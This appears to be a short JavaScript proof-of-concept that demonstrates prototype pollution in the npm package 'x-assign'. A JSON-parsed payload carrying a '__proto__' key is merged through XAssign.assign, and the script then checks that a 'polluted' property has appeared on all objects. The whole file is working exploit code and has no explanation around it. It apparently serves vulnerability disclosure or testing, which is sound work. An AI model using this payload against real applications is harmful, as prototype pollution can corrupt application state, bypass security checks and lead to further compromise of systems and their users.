var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const XAssign = require('x-assign');
console.log({}.polluted);
const a = { red: 'apple' };
const b = JSON.parse('{"__proto__": {"polluted": "yes"}}');
const c = XAssign.assign(a, b);
console.log({}.polluted);